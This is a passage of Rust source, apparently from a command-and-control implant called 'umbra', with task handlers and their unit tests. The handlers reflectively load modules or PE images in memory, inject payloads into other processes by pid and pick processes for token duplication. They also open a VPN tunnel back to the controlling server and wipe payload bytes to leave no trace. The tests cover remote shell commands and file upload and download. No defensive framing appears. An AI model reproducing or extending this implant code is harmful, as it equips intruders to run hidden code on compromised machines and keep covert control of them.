fn run_module(args: &Value) -> Outcome {
    let name = args.str_or("name", "module");
    let data = args.bin_or("data", b"");
    if data.is_empty() {
        return Outcome::err(1, "the module is empty");
    }
    let module_args = crate::bof::parse_args(args.get("args").unwrap_or(&Value::Null));
    // The module image lives in a guard: it has served its purpose when
    // this function returns, and the bytes are wiped on every path out of
    // it, including the one where the module failed to load.
    let data = crate::crypto::Zeroizing::new(data);
    let result = if data.starts_with(b"MZ") {
        // A PE image: run it in this process through the reflective loader.
        crate::post::reflective_load(&data)
    } else {
        crate::bof::run(&data, &module_args).map(|loaded| crate::post::Outcome {
            report: format!("module {name} returned {}", loaded.code),
            material: loaded.output,
        })
    };
    match result {
        Ok(outcome) => Outcome::ok(outcome.report.into_bytes()),
        Err(e) => Outcome::err(1, e),
    }
}

/// Inject a payload into a process.
fn inject(args: &Value) -> Outcome {
    let pid = args.u64_or("pid", 0) as u32;
    if pid == 0 {
        return Outcome::err(1, "inject requires args.pid");
    }
    let mode = args.str_or("mode", "reflect");
    // The payload lives in a guard: it leaves no copy in the implant, and
    // it is wiped on every path out of this function.
    let payload = crate::crypto::Zeroizing::new(args.bin_or("data", b""));
    let result = crate::post::inject(pid, &mode, &payload);
    match result {
        Ok(outcome) => Outcome::ok(outcome.report.into_bytes()),
        Err(e) => Outcome::err(1, e),
    }
}

/// The process whose token is duplicated.
fn peer_pid(args: &Value) -> Option<u32> {
    let pid = args.u64_or("pid", 0);
    if pid == 0 {
        None
    } else {
        Some(pid as u32)
    }
}

/// Join the layer-3 tunnel.
fn start_vpn(ctx: &Context, args: &Value) -> Outcome {
    let action = args.str_or("action", "start");
    if action != "start" {
        return Outcome::ok(format!("vpn {action}\n").into_bytes());
    }
    let server = {
        let explicit = args.str_or("addr", "");
        if explicit.is_empty() {
            ctx.server.clone()
        } else {
            explicit
        }
    };
    let context = ctx.clone();
    let (tx, rx) = mpsc::channel::<String>();
    thread::spawn(move || {
        let result = crate::vpn::serve(&server, &context.psk, &context.agent_id, context.verbose);
        let _ = tx.send(match result {
            Ok(address) => address,
            Err(e) => format!("error: {e}"),
        });
    });
    match rx.recv_timeout(Duration::from_secs(20)) {
        Ok(address) if !address.starts_with("error:") => {
            Outcome::ok(format!("vpn tunnel joined as {address}\n").into_bytes())
                .with("address", upk::s(&address))
        }
        Ok(address) => Outcome::err(1, address),
        Err(_) => Outcome::err(1, "the tunnel did not answer in time"),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn shell_captures_output() {
        let outcome = shell("echo umbra", 10);
        assert_eq!(outcome.code, 0);
        assert!(String::from_utf8_lossy(&outcome.out).contains("umbra"));
    }

    #[cfg(unix)]
    #[test]
    fn shell_does_not_deadlock_on_large_output() {
        // 512 KiB is eight pipe buffers: with "wait, then read" this hangs
        // until the timeout and comes back empty.
        let outcome = shell("head -c 524288 /dev/zero", 10);
        assert_eq!(outcome.code, 0);
        assert!(!outcome.out.is_empty(), "no output captured");
        assert!(outcome.err.is_empty());
    }

    #[test]
    fn drain_keeps_a_bounded_prefix() {
        let kept = drain(std::io::Cursor::new(vec![b'x'; MAX_OUTPUT + 10_000]));
        assert_eq!(kept.len(), MAX_OUTPUT + 4096);
        assert!(kept.iter().all(|b| *b == b'x'));
    }

    fn temp_path(tag: &str) -> std::path::PathBuf {
        // No tempfile dependency: the pid + a counter is unique enough here.
        use std::sync::atomic::{AtomicUsize, Ordering};
        static N: AtomicUsize = AtomicUsize::new(0);
        let n = N.fetch_add(1, Ordering::Relaxed);
        std::env::temp_dir().join(format!("umbra-test-{}-{tag}-{n}", std::process::id()))
    }

    #[test]
    fn download_is_chunked_and_hashed() {
        let path = temp_path("dl");
        std::fs::write(&path, b"0123456789").unwrap();
        let first = download(path.to_str().unwrap(), 0, 4);
        assert_eq!(first.code, 0);
        assert_eq!(&first.out[..], b"0123");
        let eof = |o: &Outcome, key: &str| o.extra.iter().find(|(k, _)| *k == key).map(|(_, v)| v.clone()).unwrap();
        assert!(matches!(eof(&first, "eof"), Value::Bool(false)));
        assert!(matches!(eof(&first, "total"), Value::Uint(10)));

        let last = download(path.to_str().unwrap(), 8, 4);
        assert_eq!(last.code, 0);
        assert_eq!(&last.out[..], b"89");
        assert!(matches!(eof(&last, "eof"), Value::Bool(true)));
        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn download_rejects_bad_ranges() {
        let path = temp_path("dl-bad");
        std::fs::write(&path, b"abc").unwrap();
        let past = download(path.to_str().unwrap(), 99, 4);
        assert_eq!(past.code, 1);
        assert!(past.err.contains("past end"));
        let dir = std::env::temp_dir();
        let is_dir = download(dir.to_str().unwrap(), 0, 4);
        assert_eq!(is_dir.code, 1);
        let missing = download("/nonexistent/umbra/file", 0, 4);
        assert_eq!(missing.code, 1);
        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn upload_rewrites_from_zero_and_verifies() {
        let path = temp_path("up");
        std::fs::write(&path, b"aaaaaaaaaa").unwrap();
        let short = upload(path.to_str().unwrap(), 0, b"bb", true);
        assert_eq!(short.code, 0);
        assert_eq!(&std::fs::read(&path).unwrap()[..], b"bb");
        // The final chunk reports the whole-file hash, not just the chunk's.
        let digest = short
            .extra
            .iter()
            .find(|(k, _)| *k == "sha256")
            .map(|(_, v)| v.clone())
            .unwrap();
        assert!(matches!(digest, Value::Str(ref s) if s == &crate::config::hex_encode(&crate::crypto::sha256(b"bb"))));
        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn unknown_kind_is_reported() {
        let outcome = run("nope", &upk::map(vec![]));
        assert_eq!(outcome.code, 2);
        assert!(outcome.err.contains("unknown task kind"));
    }
}
